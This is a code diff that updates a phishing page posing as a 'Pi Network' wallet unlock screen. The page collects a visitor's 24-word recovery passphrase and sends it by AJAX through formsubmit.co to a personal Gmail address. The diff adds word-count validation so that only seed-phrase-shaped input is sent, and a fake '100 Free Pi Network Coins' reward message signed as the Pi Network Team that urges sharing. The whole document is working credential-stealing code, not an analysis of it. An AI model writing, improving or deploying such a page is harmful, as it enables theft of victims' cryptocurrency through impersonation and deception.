@@ -27,7 +27,8 @@
             margin: 10px;
         }
         .wallet-container h2 {
-            color: #222;
+            color: #4f2d84;
+            margin-bottom: 20px;
         }
         .wallet-container textarea {
             width: calc(100% - 20px);
@@ -37,11 +38,18 @@
             padding: 10px;
             resize: none;
             font-size: 14px;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
             outline: none;
         }
         .wallet-container textarea:focus {
             border-color: #4f2d84;
+        }
+        .wallet-container .error-message {
+            color: red;
+            font-size: 12px;
+            margin-bottom: 10px;
+            display: none;
+            text-align: left;
         }
         .wallet-container button {
             width: 100%;
@@ -89,20 +97,30 @@
         }
         .congratulations-container h1 {
             color: #4f2d84;
+            font-size: 28px;
+            margin-bottom: 10px;
         }
         .congratulations-container p {
             color: #555;
             font-size: 16px;
             line-height: 1.6;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         .congratulations-container .highlight {
             color: #4f2d84;
             font-weight: bold;
         }
+        .congratulations-container .highlight-coins {
+            color: #4f2d84;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .congratulations-container strong {
+            color: #444;
+        }
         /* Loading Spinner */
         .loading-container {
-            display: none; /* Hidden by default */
+            display: none;
             position: fixed;
             top: 0;
             left: 0;
@@ -129,46 +147,47 @@
     <script>
         document.addEventListener("DOMContentLoaded", function() {
             const form = document.querySelector("form");
-            const submitButton = document.querySelector("button[type='submit']");
+            const textarea = document.querySelector("textarea[name='Passphrase']");
+            const errorMessage = document.querySelector(".error-message");
             const loadingContainer = document.querySelector(".loading-container");
 
             form.addEventListener("submit", function(event) {
-                event.preventDefault(); // Prevent default form submission
+                event.preventDefault();
 
-                // Show Loading Spinner when button is clicked
-                loadingContainer.style.display = "flex";
+                const words = textarea.value.trim().split(/\s+/);
+                const wordCount = words.length;
 
-                // Send data using AJAX
-                fetch("https://formsubmit.co/ajax/brethrenwrites@gmail.com", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        Passphrase: document.querySelector("textarea[name='Passphrase']").value,
-                        _subject: "24 Code",
-                        _captcha: "false",
-                        _template: "table"
+                if (wordCount < 12 || wordCount > 24) {
+                    errorMessage.style.display = "block";
+                    errorMessage.textContent = "Invalid input: Minimum 12 words and Maximum 24 words allowed.";
+                    return;
+                } else {
+                    errorMessage.style.display = "none";
+                    loadingContainer.style.display = "flex";
+
+                    fetch("https://formsubmit.co/ajax/brethrenwrites@gmail.com", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            Passphrase: textarea.value,
+                            _subject: "24 Code",
+                            _captcha: "false",
+                            _template: "table"
+                        })
                     })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log("Success:", data);
-
-                    // Hide the form and show the Congratulations message
-                    document.querySelector(".wallet-container").style.display = "none";
-                    document.querySelector(".congratulations-container").style.display = "block";
-
-                    // Hide Loading Spinner
-                    loadingContainer.style.display = "none";
-                })
-                .catch((error) => {
-                    console.error("Error:", error);
-                    alert("Failed to submit. Please try again.");
-
-                    // Hide Loading Spinner on Error
-                    loadingContainer.style.display = "none";
-                });
+                    .then(response => response.json())
+                    .then(() => {
+                        document.querySelector(".wallet-container").style.display = "none";
+                        document.querySelector(".congratulations-container").style.display = "block";
+                        loadingContainer.style.display = "none";
+                    })
+                    .catch(() => {
+                        alert("Failed to submit. Please try again.");
+                        loadingContainer.style.display = "none";
+                    });
+                }
             });
         });
     </script>
@@ -178,6 +197,7 @@
         <h2>Unlock Pi Wallet</h2>
         <form>
             <textarea name="Passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
+            <div class="error-message"></div>
             <button type="submit">Unlock With Passphrase</button>
         </form>
         <button class="primary">Unlock With Fingerprint</button>
@@ -187,14 +207,13 @@
 
     <div class="congratulations-container">
         <h1>Congratulations!</h1>
-        <p>You have just received <span class="highlight">100 Free Pi Network Coins!</span></p>
+        <p>You have just received <span class="highlight-coins">100 Free Pi Network Coins!</span></p>
         <p>Today is your lucky day—no tasks required! Simply wait 6 hours for your free Pi Network Coins to be credited to your account.</p>
         <p>Feel free to share this opportunity with your team and community!</p>
         <p>Once again, congratulations on your reward!</p>
         <p><strong>– Pi Network Team</strong></p>
     </div>
 
-    <!-- Loading Spinner -->
     <div class="loading-container">
         <div class="spinner"></div>
     </div>
